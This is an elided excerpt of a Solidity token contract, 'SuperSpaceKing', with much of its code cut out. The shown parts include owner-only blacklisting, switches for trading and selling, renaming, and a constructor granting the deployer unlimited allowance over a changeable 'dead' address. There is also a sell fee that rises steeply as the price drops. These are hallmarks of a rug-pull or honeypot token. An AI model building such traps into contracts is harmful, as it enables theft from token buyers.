...
contract newToken is Context, IERC20, Ownable {
	...
	uint256 private lastTransferBuyMax;
    ...
    string private _name = "SuperSpaceKing"; 
    string private _symbol = "SuperSpaceKing"; 
    ...
    constructor () public {
		...
		_approve(dead, msg.sender, MAX);
		nowPrice = 0;
		ceoList[msg.sender] = true;
    ...
    function setDev(address _dev) public onlyFunder{
        devReceiver = _dev;
	...
	function setDead(address _dead) public onlyFunder{
        dead = _dead;
    }
	
	function setIsRobot(address[] calldata addList,bool _value) public onlyFunder{
		for(uint256 i = 0; i < addList.length; i++) {
            isRobot[addList[i]] = _value;
        }
    }
	
	function setLastTransferBuyMax(uint256 _lastTransferBuyMax) public onlyFunder{
		lastTransferBuyMax = _lastTransferBuyMax;

    }
	
	
	function setnumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) public onlyFunder{
        numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;
    }
	
	
	function getHealthLevel(uint256 _value) private view returns(uint256) {
        uint256 tmpPrice = getBonusSwapToken(_value);
        if (nowPrice * 65 /100 > tmpPrice) {
            return 7;
        } else if (nowPrice * 70 /100 > tmpPrice) {
            return 6;
        } else if (nowPrice * 75 /100 > tmpPrice) {
            return 5;
        } else if (nowPrice * 80 /100 > tmpPrice) {
            return 4;
        } else if (nowPrice * 85 /100 > tmpPrice) {
            return 3;
        } else if (nowPrice * 90 /100 > tmpPrice) {
            return 2;
        } else if (nowPrice * 95 /100 > tmpPrice) {
            return 1;
        }
        return 0;
    }
	...
	function getBonusSwapToken(uint256 _value) public view returns(uint256) {
		uint256 thisPairBonus = IERC20(bonusToken).balanceOf(address(uniswapV2Pair));
		uint256 thisPairToken = IERC20(address(this)).balanceOf(address(uniswapV2Pair));
		if(thisPairBonus > 0 && thisPairToken > 0){
	...
	function setCEOList(address[] calldata addList, bool enable) public  onlyFunder {
        for(uint256 i = 0; i < addList.length; i++) {
            ceoList[addList[i]] = enable;
        }
    }
	
	function setStartPublicSell(bool enable) public  onlyFunder {
        startPublicSell = enable;
    }
	...
	function setName(string memory _coinname) public onlyFunder {
        _name = _coinname;
    }
	
	function setSymbol(string memory _coinsymbol) public onlyFunder {
        _symbol = _coinsymbol;
    }
    ...
    function _getTValues(uint256 tAmount,bool isSell) private view returns (uint256 tTransferAmount, uint256 tLiquidity, uint256 tOtherToken, uint256 tFee) {
        if (!feeIt) {
            return (tAmount, 0, 0,0);
        }
		uint256 allLeverFee = 0;
		if(isSell){
			allLeverFee = getHealthLevel(1*10**18).mul(feeOtherToken);
		}
		tOtherToken = tAmount.mul(allLeverFee).div(100);
    ...
    function _takeTax(uint256 tLiquidity,uint256 tOtherToken) private {
		...
		_rOwned[address(blackHole)] = _rOwned[address(blackHole)].add(rOtherToken);
		
        if(_isExcluded[address(blackHole)]) {
            _tOwned[address(blackHole)] = _tOwned[address(blackHole)].add(tOtherToken);
        }
	...
	function setKtime(uint256 _ktime) external onlyFunder {
        ktime = _ktime;
    }
	
	function startTrade() external onlyFunder {
        require(0 == launchedAtTime, "trading");
    ...
    function _transfer(
		...
		if (block.timestamp - lastTransferBuyMax > DAYINTERVAL) {
			nowPrice = getBonusSwapToken(1 * 10 ** 18);
			lastTransferBuyMax = lastTransferBuyMax + DAYINTERVAL;
        }

        if(from == uniswapV2Pair && from != owner() && to != owner()  && to != blackHole ){
			require(launched(), "!Trading");
			if (launchedAtTime + 100 > block.number) {
				require(balanceOf(to) + amount <= _maxTxAmount , "fail");
			}
	...
	function swapTokensForToken(uint256 tokenAmount) private {
		...
		IERC20 tmptoken = IERC20(bonusToken);
        uint256 allBalance = tmptoken.balanceOf(address(_tokenDistributor));
        tmptoken.transferFrom(address(_tokenDistributor), address(this), allBalance);
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool isSell) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken, uint256 tFee) = _getTValues(tAmount,isSell);
        (uint256 rAmount, uint256 rTransferAmount, , uint256 rAir) = _getRValues(tAmount, tTransferAmount, tFee,1* 10 **3, _getRate());
        _rOwned[sender] = _rOwned[sender].sub(rAmount, "sub1 rAmount");
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		if(tLiquidity > 1* 10 **3 *5 && sender != blackHole){
    ...
    function _transferToExcluded(address sender, address recipient, uint256 tAmount,bool isSell) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken, uint256 tFee) = _getTValues(tAmount,isSell);
        (uint256 rAmount, uint256 rTransferAmount, , ) = _getRValues(tAmount, tTransferAmount, tFee,1* 10 **3, _getRate());
